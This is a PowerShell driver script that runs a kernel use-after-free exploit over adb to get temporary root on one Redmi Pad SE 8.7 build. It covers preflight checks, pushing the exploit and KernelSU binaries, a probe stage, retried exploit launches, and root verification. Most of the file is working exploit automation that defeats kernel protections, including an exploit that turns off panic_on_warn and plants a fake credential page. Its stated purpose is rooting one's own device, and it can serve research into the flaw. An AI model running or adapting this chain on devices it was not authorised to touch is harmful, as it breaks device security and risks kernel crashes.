<#
.SYNOPSIS
    Temporary root on the Redmi Pad SE 8.7 (flare / MT8786) via CVE-2026-98260.

.DESCRIPTION
    One command, from a freshly booted tablet to `uid=0(root)`.

    What it does:
      1. preflight  - kernel string must match the exploit profile exactly,
                      tracefs must be readable by the shell user, bootloader state
      2. push       - re-push the exploit only if /data/local/tmp lost it or it
                      differs from the artifact (Android cleans that directory)
      3. probe      - zero-risk self-test; the UAF is NOT triggered here
      4. exploit    - `--auto` launched detached and polled, retried, because the
                      last stage is a probabilistic page reclaim. The process parks a
                      holder and never exits, so it must not be waited on.
      5. verify     - the five checks from docs/11-reproduce.md

    What it never does:
      * no partition writes, no `dd`, no flash, no reboot
      * does not kill the parked holder process - doing so can panic the kernel

    Exit codes: 0 = root verified, 1 = failure, 2 = precondition unmet.

.PARAMETER Device
    adb serial. Defaults to the only attached device.

.PARAMETER Binary
    Artifact to push. Default 'shark-k66118-32cand' (32 candidates at 64 KiB
    granularity - see docs/09-root-cause.md and kpgc10kai/Shark#6).
    The older 4-candidate build is 'shark-k66118-fixed'.

.PARAMETER MaxAttempts
    How many times to run `--auto` before giving up. Default 4.

.PARAMETER ProbeOnly
    Stop after the probe. Use this to check a machine without triggering the UAF.

.PARAMETER Force
    Run even if the device already reports `uid=0`.

.PARAMETER SkipPush
    Assume /data/local/tmp already holds the artifacts.

.EXAMPLE
    .\scripts\root.ps1

.EXAMPLE
    .\scripts\root.ps1 -ProbeOnly

.EXAMPLE
    .\scripts\root.ps1 -Binary shark-k66118-fixed -MaxAttempts 6
#>
[CmdletBinding()]
param(
    [string]$Device,
    [string]$Binary = 'shark-k66118-32cand',
    [string]$Ksud = 'ksud-3.3.1',

    # Directory holding the binaries. Defaults to a search of the usual layouts.
    [string]$ArtifactsDir,
    [int]$MaxAttempts = 4,

    # Seconds to wait for root after each launch. The exploit parks a holder
    # process instead of exiting, so we poll rather than wait for the command.
    [int]$AttemptTimeoutSec = 120,
    [switch]$ProbeOnly,
    [switch]$Force,
    [switch]$SkipPush
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# ---------------------------------------------------------------------------
# constants
# ---------------------------------------------------------------------------
$KERNEL = '6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k'
$REMOTE_BIN = '/data/local/tmp/shark66118'
$REMOTE_KSUD = '/data/local/tmp/ksud33'
$MANAGER = 'me.weishu.kernelsu'
$KMI = 'android15-6.6'
$TMP = '/data/local/tmp'

# ---------------------------------------------------------------------------
# locate the binaries
# ---------------------------------------------------------------------------
# This script is meant to be copyable, so look in a few layouts rather than
# hard-coding one: next to the script, one level up, the published repo, and a
# build32 subdirectory of any of those.
$ArtifactsBases = @(
    $ArtifactsDir,
    (Join-Path $PSScriptRoot 'artifacts'),
    (Join-Path (Split-Path $PSScriptRoot -Parent) 'artifacts'),
    (Join-Path (Split-Path $PSScriptRoot -Parent) 'redmi-pad-se-87-root\artifacts')
) | Where-Object { $_ -and (Test-Path $_) }

# Each base is followed immediately by its build32 subdirectory, so a local
# build32 beats a parent directory that happens to hold the same binary.
$ArtifactsDirs = @(foreach ($b in @($ArtifactsBases)) {
    $b
    $sub = Join-Path $b 'build32'
    if (Test-Path $sub) { $sub }
})

function Find-Artifact([string[]]$names) {
    # Nearest directory first, then fall back to the published repo layout, so a
    # copy sitting next to its own binaries uses those rather than the repo's.
    foreach ($n in $names) {
        if ($n -and [System.IO.Path]::IsPathRooted($n) -and (Test-Path $n)) { return (Resolve-Path $n).Path }
    }
    foreach ($d in $ArtifactsDirs) {
        foreach ($n in $names) {
            if (-not $n) { continue }
            $p = Join-Path $d $n
            if (Test-Path $p) { return $p }
        }
    }
    return $null
}

$LocalBin = Find-Artifact @($Binary, 'shark-k66118-32cand', 'shark-k66118-32', 'shark-k66118-fixed')
$LocalKsud = Find-Artifact @($Ksud, 'ksud-3.3.1', 'ksud33', 'ksud')

# ---------------------------------------------------------------------------
# tiny helpers
# ---------------------------------------------------------------------------
function Say($text, $colour = 'Gray') {
    Write-Host $text -ForegroundColor $colour
}
function Head($text) {
    Write-Host ''
    Write-Host "── $text " -ForegroundColor Cyan -NoNewline
    Write-Host ('─' * [Math]::Max(0, 58 - $text.Length)) -ForegroundColor DarkGray
}
function Ok($text)   { Write-Host "  ✅ $text" -ForegroundColor Green }
function Bad($text)  { Write-Host "  ❌ $text" -ForegroundColor Red }
function Warn($text) { Write-Host "  ⚠️  $text" -ForegroundColor Yellow }
function Info($text) { Write-Host "  ·  $text" -ForegroundColor DarkGray }

function Find-Adb {
    $cmd = Get-Command adb -ErrorAction SilentlyContinue
    if ($cmd) { return $cmd.Source }
    $guess = Join-Path $env:LOCALAPPDATA 'Android\Sdk\platform-tools\adb.exe'
    if (Test-Path $guess) { return $guess }
    throw "adb not found. Install platform-tools or put adb on PATH."
}

function Resolve-Device($adb) {
    if ($Device) { return $Device }
    $lines = @(& $adb devices 2>&1 | Where-Object { $_ -match '^\S+\s+device$' })
    if ($lines.Count -eq 0) {
        $raw = (& $adb devices 2>&1) -join "`n"
        if ($raw -match 'unauthorized') {
            throw "device is unauthorized - accept the USB debugging prompt on the tablet."
        }
        throw "no device attached. Plug in the tablet and enable USB debugging."
    }
    if ($lines.Count -gt 1) { throw "multiple devices attached - pass -Device <serial>." }
    return ($lines[0] -split '\s+')[0]
}

function Sh($adb, $serial, $command) {
    # run a shell command on the device, return its combined output as one string
    $out = & $adb -s $serial shell $command 2>&1
    return (($out | ForEach-Object { "$_".Trim() }) -join "`n").Trim()
}

function Get-RemoteHash($adb, $serial, $path) {
    $h = Sh $adb $serial "sha256sum $path 2>/dev/null"
    if ($h -match '^([0-9a-f]{64})') { return $Matches[1] }
    return $null
}

# ---------------------------------------------------------------------------
# 0. locate pieces
# ---------------------------------------------------------------------------
Say ''
Say '  CVE-2026-98260 · Redmi Pad SE 8.7 · temporary root' 'White'
Say '  zero partition writes · bootloader stays locked · reboot undoes everything' 'DarkGray'

Head 'locating files'
if (-not $LocalBin) {
    Bad "exploit binary not found (looked for: $Binary, shark-k66118-32)"
    Info "searched: $($ArtifactsDirs -join '; ')"
    exit 2
}
if (-not $LocalKsud) {
    Bad 'ksud not found (looked for: ksud-3.3.1)'
    Info "searched: $($ArtifactsDirs -join '; ')"
    exit 2
}
foreach ($f in @($LocalBin, $LocalKsud)) {
    Info ("{0}  ({1:N1} MB)  {2}" -f (Split-Path $f -Leaf), ((Get-Item $f).Length / 1MB), (Split-Path $f -Parent))
}

$adb = Find-Adb
Info "adb: $adb"
try { $serial = Resolve-Device $adb } catch { Bad $_.Exception.Message; exit 2 }
Ok "device: $serial"

# ---------------------------------------------------------------------------
# 1. preflight
# ---------------------------------------------------------------------------
Head 'preflight'

$kernel = Sh $adb $serial 'uname -r'
if ($kernel -ne $KERNEL) {
    Bad "kernel mismatch"
    Info "  device : $kernel"
    Info "  expected: $KERNEL"
    Say ''
    Say '  The exploit profile is matched against the whole string, so a different' 'DarkGray'
    Say '  build will not work as-is. See docs/11-reproduce.md section 6.' 'DarkGray'
    exit 2
}
Ok "kernel  $kernel"

$boot = Sh $adb $serial 'getprop ro.boot.verifiedbootstate'
if ($boot -ne 'green') { Warn "verifiedbootstate=$boot (expected green)" } else { Ok "bootloader LOCKED (verifiedbootstate=green)" }

$groups = Sh $adb $serial 'id'
if ($groups -match '3012\(readtracefs\)') { Ok 'shell is in readtracefs (tracefs readable)' }
else { Bad 'shell is not in readtracefs - the probe cannot read the trace buffer'; exit 2 }

$selinux = Sh $adb $serial 'getenforce'
Info "getenforce = $selinux"

# already rooted?
$pre = Sh $adb $serial 'su -c id'
$already = $pre -match 'uid=0\(root\)'
if ($already -and -not $Force) {
    Head 'already rooted'
    Ok 'uid=0(root) is already available - nothing to do.'
    Info 'Use -Force to run the exploit again anyway.'
    Say ''
    Say "  root is temporary: a reboot removes it." 'DarkGray'
    Say "  To hand it back now:  adb reboot" 'DarkGray'
    exit 0
}
if ($already) { Warn 'already rooted, but -Force was given; continuing' }

# ---------------------------------------------------------------------------
# 2. push (only what is missing or stale)
# ---------------------------------------------------------------------------
if (-not $SkipPush) {
    Head 'push to /data/local/tmp'

    foreach ($pair in @(
            @($LocalBin, $REMOTE_BIN, 'exploit'),
            @($LocalKsud, $REMOTE_KSUD, 'ksud')
        )) {
        $local, $remote, $label = $pair
        $want = (Get-FileHash $local -Algorithm SHA256).Hash.ToLower()
        $have = Get-RemoteHash $adb $serial $remote
        if ($have -eq $want) {
            Info "$label  up to date"
        }
        else {
            if (-not $have) { Info "$label  missing on device (tmp is cleaned on boot)" }
            else { Info "$label  stale" }
            & $adb -s $serial push $local $remote 2>&1 | Out-Null
            $have = Get-RemoteHash $adb $serial $remote
            if ($have -ne $want) { Bad "$label  push failed (hash mismatch)"; exit 2 }
            Ok "$label  pushed"
        }
    }
    Sh $adb $serial "chmod 755 $REMOTE_BIN $REMOTE_KSUD" | Out-Null
    Ok 'permissions 755'
}

# ---------------------------------------------------------------------------
# 3. probe - zero risk
# ---------------------------------------------------------------------------
Head 'probe (does not trigger the UAF)'

$probe = Sh $adb $serial "$REMOTE_BIN probe"

$pick = {
    param($pattern, $text)
    $m = [regex]::Match($text, $pattern)
    if ($m.Success) { return $m.Groups[1].Value }
    return $null
}

$pTrace = & $pick 'PROBE_TRACE=(\w+)' $probe
$pTim = [regex]::Match($probe, 'PROBE_TIMER made=(\d+) recs=(\d+) site=(\S+) low_adj=(\S+)')
$pSlide = [regex]::Match($probe, 'PROBE_SLIDE=(\S+) aligned=(\d)')
$pCalib = [regex]::Match($probe, '\[calib\] timers=(\d+) low_adj=(\S+)')
$pTask = [regex]::Match($probe, 'task_recs=(\d+)')
$pBase = [regex]::Match($probe, 'PROBE_LINEAR_MAP=(\S+)')

$okProbe = $true

if ($pTrace -eq 'yes') { Ok 'PROBE_TRACE=yes  (tracefs readable)' }
else { Bad 'PROBE_TRACE=no   (cannot read the trace buffer)'; $okProbe = $false }

if ($pTim.Success) {
    Info ("PROBE_TIMER  made={0} recs={1}" -f $pTim.Groups[1].Value, $pTim.Groups[2].Value)
    Info ("             low_adj={0}" -f $pTim.Groups[4].Value)
    if ($pTim.Groups[2].Value -eq '0') {
        Bad 'recs=0 - no timer record matched; the low-21-bit compensation is wrong'
        $okProbe = $false
    }
}
else { Bad 'PROBE_TIMER missing - probe aborted early'; $okProbe = $false }

if ($pSlide.Success) {
    Info ("PROBE_SLIDE  {0}  aligned={1}" -f $pSlide.Groups[1].Value, $pSlide.Groups[2].Value)
    if ($pSlide.Groups[2].Value -eq '0') {
        Info '             aligned=0 is expected on this device (see docs/09)'
    }
}

if ($pCalib.Success) {
    if ($pCalib.Groups[1].Value -eq '0') {
        Bad '[calib] timers=0 - the KASLR low-21-bit filter matched nothing'
        $okProbe = $false
    }
    else {
        Ok ("[calib] timers={0} low_adj={1}" -f $pCalib.Groups[1].Value, $pCalib.Groups[2].Value)
    }
}

if ($pTask.Success) {
    if ($pTask.Groups[1].Value -eq '0') {
        Bad 'task_recs=0 - the task leak failed'
        $okProbe = $false
    }
    else { Ok "task_recs=$($pTask.Groups[1].Value)" }
}

if ($pBase.Success) { Info "linear map base = $($pBase.Groups[1].Value)" }

if (-not $okProbe) {
    Head 'probe failed'
    Say '  Nothing was triggered, so the device is untouched. Common causes:' 'DarkGray'
    Say '    · wrong binary for this kernel build' 'DarkGray'
    Say '    · another process flooding the trace buffer - turn OFF developer options' 'DarkGray'
    Say '      "System tracing" / "Trace debuggable apps" and reboot (Shark issue #3)' 'DarkGray'
    Say '    · the kernel already has the fix for CVE-2026-98260' 'DarkGray'
    exit 1
}

if ($ProbeOnly) {
    Head 'done (probe only)'
    Ok 'machine is ready to be rooted.'
    exit 0
}

# ---------------------------------------------------------------------------
# 4. exploit, retried
# ---------------------------------------------------------------------------
Head 'exploit --auto'

$envPrefix = "PYB110_KSUD=$REMOTE_KSUD PYB110_MANAGER_PKG=$MANAGER PYB110_KMI=$KMI"

# A run either succeeds (and stays alive holding the faked cred page) or fails
# (and parks the same way).  Either way an instance may still be running, and
# starting a second one while the first still holds pages is how you get a
# kernel that reboots under you.  So: never overlap.
function Get-ExploitPid {
    $p = Sh $adb $serial "pidof $(Split-Path $REMOTE_BIN -Leaf) 2>/dev/null"
    if ($p -match '^\d+') { return $p.Trim() }
    return $null
}

$succeeded = $false
$attemptsMade = 0
$stoppedOnHolder = $false
for ($i = 1; $i -le $MaxAttempts; $i++) {
    $attemptsMade = $i
    Say ''
    Say ("  attempt $i / $MaxAttempts") 'White'

    $busy = Get-ExploitPid
    if ($busy) {
        Warn "an exploit instance is still running (pid $busy) - not starting another one"
        Info 'that is the normal end state after a run, whether it succeeded or not.'
        Info 'reboot to clear it:   adb reboot'
        $stoppedOnHolder = $true
        break
    }

    $runLog = "$TMP/shark_run_$i.log"

    # Two details make the launch actually return:
    #   * separate the commands with ';' -- chaining them with '&&' and then '&'
    #     backgrounds the whole and-or list, and that wrapping subshell keeps the
    #     pty's stdout open, so `adb shell` never sees EOF and hangs
    #   * redirect all three descriptors and use setsid, so the exploit cannot
    #     hold the pty either
    $launch = "cd $TMP; rm -f $runLog; " +
              "setsid env $envPrefix $REMOTE_BIN --auto > $runLog 2>&1 < /dev/null & echo LAUNCHED"
    $launched = Sh $adb $serial $launch
    if ($launched -notmatch 'LAUNCHED') {
        Warn "could not start the exploit: $launched"
        continue
    }

    # Poll for root, but stop early once the run reaches a terminal marker, so a
    # failed attempt is retried promptly and a finished one is not restarted.
    $rootId = $null
    $deadline = (Get-Date).AddSeconds($AttemptTimeoutSec)
    while ((Get-Date) -lt $deadline) {
        Start-Sleep -Seconds 3
        $who = Sh $adb $serial 'su -c id'
        if ($who -match 'uid=0\(root\)') { $rootId = $who; break }
        $tail = Sh $adb $serial "tail -1 $runLog 2>/dev/null"
        if ($tail -match 'FAIL_EXIT=|LATE_LOAD_SHELL_RC=|LATE_LOAD_RC=|parking without reap') { break }
    }

    # The log can reach LATE_LOAD_SHELL_RC= a moment before the freshly loaded
    # module actually answers su, so a failed poll here is not a failed run.
    # Give ksud a short window to register before believing it.
    if (-not $rootId) {
        for ($k = 0; $k -lt 8; $k++) {
            Start-Sleep -Seconds 2
            $who = Sh $adb $serial 'su -c id'
            if ($who -match 'uid=0\(root\)') { $rootId = $who; break }
        }
    }

    $out = Sh $adb $serial "cat $runLog 2>/dev/null"
    foreach ($line in ($out -split "`n")) {
        if ($line -match 'stage |burst|PLANT_CRED|PARKED|LATE_LOAD|FAIL|child report|holding zombie|PROBE_TIMER_FAIL') {
            $colour = 'DarkGray'
            if ($line -match 'burst hit=1') { $colour = 'Green' }
            if ($line -match 'hit=0|-FAIL|FAIL=|missed|holding zombie') { $colour = 'Red' }
            if ($line -match 'PLANT_CRED_OK|LATE_LOAD_RC=0') { $colour = 'Green' }
            Write-Host "    $line" -ForegroundColor $colour
        }
    }

    if ($rootId) {
        $succeeded = $true
        break
    }

    # Give the process a moment to exit before deciding whether a retry is safe.
    Start-Sleep -Seconds 3
    if (Get-ExploitPid) {
        Warn 'the run ended without root and left a parked holder process.'
        Info 'retrying now would run two instances over the same pages.'
        Info 'reboot, then run this script again:   adb reboot'
        $stoppedOnHolder = $true
        break
    }

    if ($i -lt $MaxAttempts) {
        Info 'no root, and the process exited cleanly - retrying'
    }
}

if (-not $succeeded) {
    Head 'failed'

    if ($stoppedOnHolder) {
        Bad "stopped after $attemptsMade attempt(s): a parked holder is still alive"
        Say ''
        Say '  The exploit is probabilistic (roughly 2 of 3 per the notes), and a failed' 'DarkGray'
        Say '  stage parks the same holder a successful one leaves behind. Running again' 'DarkGray'
        Say '  on top of it puts two instances over the same pages, so this script stops.' 'DarkGray'
        Say ''
        Say '  Reboot to clear the holder, then run it again:' 'DarkGray'
        Say '    adb reboot;  .\scripts\root.ps1' 'DarkGray'
    }
    else {
        Bad "no root after $attemptsMade attempt(s)"
        Say ''
        Say '  Every attempt exited cleanly, so retrying is safe:' 'DarkGray'
        Say '    .\scripts\root.ps1 -MaxAttempts 8' 'DarkGray'
    }

    Say ''
    Say '  Never kill a parked holder by hand - it holds a fake cred page and' 'DarkGray'
    Say '  killing it can panic the kernel.' 'DarkGray'
    exit 1
}

Ok "root acquired on attempt $i"

# Let ksud finish writing /system/bin/su before the verify reads below run;
# querying during that write returns "Text file busy".
Start-Sleep -Seconds 2

# ---------------------------------------------------------------------------
# 5. verify
# ---------------------------------------------------------------------------
Head 'verify'

$checks = @(
    @{ name = 'kernelsu module'; cmd = 'grep kernelsu /proc/modules'; want = 'kernelsu.*Live' }
    @{ name = 'uid'; cmd = 'su -c id'; want = 'uid=0\(root\)' }
    @{ name = 'caps'; cmd = "su -c 'grep -E ""^Cap(Eff)"" /proc/self/status'"; want = '000001ffffffffff' }
    @{ name = 'data access'; cmd = 'su -c "ls /data/adb"'; want = 'ksu|modules' }
    @{ name = 'write test'; cmd = "su -c 'echo ok > /data/adb/_t && cat /data/adb/_t && rm /data/adb/_t'"; want = 'ok' }
)

$allOk = $true
foreach ($c in $checks) {
    $res = Sh $adb $serial $c.cmd
    if ($res -match $c.want) { Ok ("{0,-16} {1}" -f $c.name, ($res -replace "`n", ' | ').Substring(0, [Math]::Min(72, ($res -replace "`n", ' | ').Length))) }
    else { Bad ("{0,-16} {1}" -f $c.name, ($res -replace "`n", ' | ')); $allOk = $false }
}

$sel = Sh $adb $serial 'su -c getenforce'
Info "selinux = $sel"
$pow = Sh $adb $serial 'su -c cat /proc/sys/kernel/panic_on_warn'
Info "panic_on_warn = $pow  (the exploit sets this to 0)"

$holders = Sh $adb $serial "ps -A -o PID,NAME | grep $REMOTE_BIN 2>/dev/null"
if ($holders) {
    Info 'a holder process is still running - this is by design, leave it alone:'
    foreach ($h in ($holders -split "`n")) { Info "    $h" }
}

# ---------------------------------------------------------------------------
# summary
# ---------------------------------------------------------------------------
Head 'result'
if ($allOk) {
    Ok 'uid=0(root) with a full capability set.'
    Say ''
    Say '  lasts until reboot. no partition was written, bootloader still locked.' 'DarkGray'
    Say '  to hand it back:            adb reboot' 'DarkGray'
    Say '  to open a root shell:       adb shell su -c sh' 'DarkGray'
    exit 0
}

Warn 'root is present but a verification step failed - inspect the lines above.'
exit 1
